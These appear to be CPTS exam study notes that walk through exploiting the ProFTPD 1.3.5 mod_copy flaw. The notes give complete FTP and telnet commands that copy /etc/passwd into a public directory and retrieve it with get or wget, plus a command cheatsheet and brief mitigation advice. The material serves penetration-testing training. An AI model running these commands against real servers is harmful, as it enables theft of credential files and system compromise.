# ProFTPD 1.3.5 mod_copy Exploit - CPTS Notes

---

# 🧩 1. Overview

- Target: ProFTPD 1.3.5
- Module: mod_copy
- Issue: Arbitrary file copy via FTP SITE commands

✔ Attack uses:
- SITE CPFR → Copy FROM (source)
- SITE CPTO → Copy TO (destination)

✔ Impact:
- Read sensitive files (e.g., /etc/passwd)
- Write files to FTP-accessible locations

---

# ⚠️ 2. Vulnerability

If `mod_copy` is enabled:

- Attacker can copy ANY readable file
- File can be moved to:
  - Web directory
  - FTP public directory

✔ Result:
- Sensitive data exposure

---

# 🔗 3. Exploitation Steps

## Step 1: Connect to FTP

```
ftp 192.168.1.234 2121
```

---

## Step 2: Check SITE Commands

```
ftp> site help
```

✔ Look for:
```
CPFR
CPTO
```

---

## Step 3: Copy Sensitive File

### Set Source File

```
ftp> site cpfr /etc/passwd
```

---

### Set Destination Path

```
ftp> site cpto /var/ftp/pub/passwd
```

✔ Now file is copied to public directory

---

## Step 4: Download File

```
ftp> cd /pub
ftp> get passwd
```

---

# 🌐 4. Alternate Methods

## Using wget (anonymous FTP)

```
wget ftp://anonymous@192.168.1.234/pub/passwd
```

---

## Using Telnet

```
telnet 192.168.1.234 2121
```

Then:

```
site help
site cpfr /etc/passwd
site cpto /var/ftp/pub/passwd
```

---

# 📥 5. Download All Files

```
wget -m ftp://anonymous@192.168.1.234/pub/
```

---

## With Credentials

```
wget -m --no-passive ftp://user:pass@192.168.1.32
```

---

# ⚙️ 6. Important Notes

## Binary Mode

```
ftp> binary
```

✔ Prevents file corruption

---

## Permissions

- Requires write access to destination directory

---

## Real-World Impact

- If `/etc/shadow` is readable → HIGH RISK
- Leads to:
  - Password cracking
  - Full system compromise

---

# 🛡️ 7. Mitigation

- Disable `mod_copy`
- Upgrade ProFTPD
- Restrict FTP access
- Use:
  - SFTP
  - FTPS

---

# 🔥 CPTS Quick Cheatsheet

| Action              | Command |
|-------------------|--------|
| Connect FTP        | ftp <IP> 2121 |
| Check commands     | site help |
| Copy source        | site cpfr /etc/passwd |
| Copy destination   | site cpto /var/ftp/pub/passwd |
| Download file      | get passwd |

# 🧠 Key Points

- No auth sometimes required (misconfig)
- Uses native FTP SITE commands
- Very common in labs/exams
- Easy but powerful exploit
